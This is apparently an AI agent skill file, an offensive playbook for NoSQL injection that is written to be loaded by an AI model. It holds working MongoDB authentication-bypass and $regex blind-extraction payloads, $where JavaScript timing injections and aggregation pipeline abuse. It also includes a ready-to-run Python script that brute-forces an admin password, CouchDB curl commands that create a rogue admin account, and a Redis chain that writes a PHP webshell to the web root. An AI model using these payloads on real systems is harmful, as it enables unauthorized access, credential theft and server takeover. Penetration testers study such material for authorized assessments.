---
name: nosql-injection
description: >-
  NoSQL injection playbook. Use when MongoDB-style operators, JSON query objects, flexible search filters, or backend query DSLs may allow data or logic abuse.
---

# SKILL: NoSQL Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: NoSQL injection is fundamentally different from SQL injection. Covers MongoDB operator injection, authentication bypass, blind extraction, aggregation pipeline injection, and Redis/CouchDB specific attacks. Very commonly missed by testers who only know SQLi patterns.

---

## 1. CORE CONCEPT — OPERATOR INJECTION

**SQL Injection** breaks out of string literals.  
**NoSQL Injection** injects **query operators** that change query logic.

MongoDB example — normal query:
```javascript
db.users.find({username: "alice", password: "secret"})
```

Injection via JSON operator:
```json
{
  "username": "admin",
  "password": {"$gt": ""}
}
```
→ Becomes: `find({username:"admin", password:{$gt:""}})` → password > "" → always true!

---

## 2. MONGODB — LOGIN BYPASS

### JSON Body Injection (API with JSON Content-Type)
```json
POST /api/login
Content-Type: application/json

{"username": "admin", "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$regex": ".*"}}
```

### PHP `$_POST` Array Injection (URL-encoded form)
```
username=admin&password[$ne]=invalid
username=admin&password[$gt]=
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$regex]=.*
```

### Ruby / Python `params` Array Injection
Same as PHP — use bracket notation to inject objects:
```
?username[%24ne]=invalid&password[%24ne]=invalid
```
`%24` = URL-encoded `$`

---

## 3. MONGODB OPERATORS FOR INJECTION

| Operator | Meaning | Use Case |
|---|---|---|
| `$ne` | not equal | `{"password": {"$ne": "x"}}` → always matches |
| `$gt` | greater than | `{"password": {"$gt": ""}}` → all non-empty passwords match |
| `$gte` | greater or equal | Similar to $gt |
| `$lt` | less than | `{"password": {"$lt": "~"}}` → all ASCII match |
| `$regex` | regex match | `{"username": {"$regex": "adm.*"}}` |
| `$where` | JS expression | MOST DANGEROUS — code execution |
| `$exists` | field exists | `{"admin": {"$exists": true}}` |
| `$in` | in array | `{"username": {"$in": ["admin","user"]}}` |

---

## 4. BLIND DATA EXTRACTION VIA $REGEX

Like binary search in SQLi, use `$regex` to extract field values character by character:

```json
// Does admin's password start with 'a'?
{"username": "admin", "password": {"$regex": "^a"}}

// Does admin's password start with 'b'?
{"username": "admin", "password": {"$regex": "^b"}}

// Continue: narrow down each position
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^ac"}}
```

**Response difference**: successful login vs failed login = boolean oracle.

**Automate** with NoSQLMap or custom script with binary search on character set.

---

## 5. MONGODB $WHERE INJECTION (JS EXECUTION)

`$where` evaluates JavaScript in MongoDB context.  
**Can only use current document's fields** — not system access. But allows logic abuse:

```json
{"$where": "this.username == 'admin' && this.password.length > 0"}

// Blind extraction via timing:
{"$where": "if(this.username=='admin'){sleep(5000);return true;}else{return false;}"}

// Regex via JS:
{"$where": "this.username.match(/^adm/) && true"}
```

**Limit**: `$where` doesn't give OS command execution — **server-side JS injection** (not to be confused with command injection).

---

## 6. AGGREGATION PIPELINE INJECTION

When user-controlled data enters `$match` or `$group` stages:

```javascript
// Vulnerable code:
db.collection.aggregate([
  {$match: {category: userInput}},  // userInput = {"$ne": null}
  ...
])
```

Inject operators to bypass:
```json
// Input as object:
{"$ne": null}  → matches all categories
{"$regex": ".*"}  → matches all
```

---

## 7. HTTP PARAMETER POLLUTION FOR NOSQL

Some frameworks (Express.js, PHP) parse repeating parameters as arrays:
```
?filter=value1&filter=value2 → filter = ["value1", "value2"]
```

Use `qs` library parse behavior in Node.js:
```
?filter[$ne]=invalid
→ parsed as: filter = {$ne: "invalid"}
→ NoSQL operator injection
```

---

## 8. COUCHDB ATTACKS

### HTTP Admin API (if exposed)
```bash
# List databases:
curl http://target.com:5984/_all_dbs

# Read all documents in a DB:
curl http://target.com:5984/DATABASE_NAME/_all_docs?include_docs=true

# Create admin account (if anonymous access allowed):
curl -X PUT http://target.com:5984/_config/admins/attacker -d '"password"'
```

---

## 9. REDIS INJECTION

Redis exposed (6379) with no auth — command injection via input used in Redis queries:

```
# Via SSRF or direct injection:
SET key "<?php system($_GET['cmd']); ?>"
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
BGSAVE
```

**Auth bypass** (older Redis with `requirepass` using simple password):
```
AUTH password
AUTH 123456
AUTH redis
AUTH admin
```

---

## 10. DETECTION PAYLOADS

Send these to any input processed by NoSQL backend:

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', sleep(1000)
1' ; sleep(1000)
{"$gt": ""}
{"$ne": "invalid"}
[$ne]=invalid
[$gt]=
```

**JSON variant** test (change Content-Type to `application/json` if endpoint is form-based):
```json
{"username": "admin", "password": {"$ne": ""}}
```

---

## 11. NOSQL VS SQL — KEY DIFFERENCES

| Aspect | SQLi | NoSQLi |
|---|---|---|
| Language | SQL syntax | Query operator objects |
| Injection vector | String concatenation | Object/operator injection |
| Common signal | Quote breaks response | `{$ne:x}` changes response |
| Extraction method | UNION / error-based | `$regex` character oracle |
| Auth bypass | `' OR 1=1--` | `{"password":{"$ne":""}}` |
| OS command | xp_cmdshell (MSSQL) | Rare (need `$where` + CVE) |
| Fingerprint | DB-specific error messages | "cannot use $" errors |

---

## 12. TESTING CHECKLIST

```
□ Test login fields with: {"$ne": "invalid"} JSON body
□ Test URL-encoded forms: password[$ne]=invalid
□ Test $regex for blind enumeration of field values
□ Try $where with sleep() for time-based blind
□ Check 5984 port for CouchDB (unauthenticated admin)
□ Check 6379 port for Redis (unauthenticated)
□ Try Content-Type: application/json on form endpoints
□ Monitor for operator-related error messages ("BSON" "operator" "$not allowed")
```

---

## 13. BLIND NoSQL EXTRACTION AUTOMATION

### $regex Character-by-Character Extraction (Python Template)

```python
import requests
import string

url = "http://target/login"
charset = string.ascii_lowercase + string.digits + string.punctuation
password = ""

while True:
    found = False
    for c in charset:
        payload = {
            "username": "admin",
            "password[$regex]": f"^{password}{c}.*"
        }
        r = requests.post(url, json=payload)
        if "success" in r.text or r.status_code == 302:
            password += c
            found = True
            print(f"Found: {password}")
            break
    if not found:
        break

print(f"Final password: {password}")
```

### $regex via URL-encoded GET Parameters

```
username=admin&password[$regex]=^a.*
username=admin&password[$regex]=^ab.*
# Iterate through charset until login succeeds
```

### Duplicate Key Bypass

```json
// When app checks one key but processes another:
{"id": "10", "id": "100"}
// JSON parsers typically use last occurrence
// Bypass: WAF validates id=10, app processes id=100
```

---

## 14. AGGREGATION PIPELINE INJECTION

When user input reaches MongoDB aggregation pipeline stages:

```javascript
// If user controls $match stage:
db.collection.aggregate([
  { $match: { user: INPUT } }  // INPUT from user
])

// Injection: provide object instead of string
// INPUT = {"$gt": ""} → matches all documents

// $lookup for cross-collection data access:
// If $lookup stage is injectable:
{ $lookup: {
    from: "admin_users",       // attacker-chosen collection
    localField: "user_id",
    foreignField: "_id",
    as: "leaked"
}}

// $out to write results to new collection:
{ $out: "public_collection" }  // Write query results to accessible collection
```

### $where JavaScript Execution

```javascript
// $where allows arbitrary JavaScript (DANGEROUS):
db.users.find({ $where: "this.username == 'admin'" })

// If input reaches $where:
// Injection: ' || 1==1 || '
// Or: '; return true; var x='
// Time-based: '; sleep(5000); var x='
// Data exfil: '; if(this.password[0]=='a'){sleep(5000)}; var x='
```

**Reference**: Soroush Dalili — "MongoDB NoSQL Injection with Aggregation Pipelines" (2024)

**Note:** `$where` runs JavaScript on the server. Besides logic abuse and timing oracles, older MongoDB builds without a tight V8 sandbox historically raised RCE concerns; prefer treating any `$where` sink as high risk.
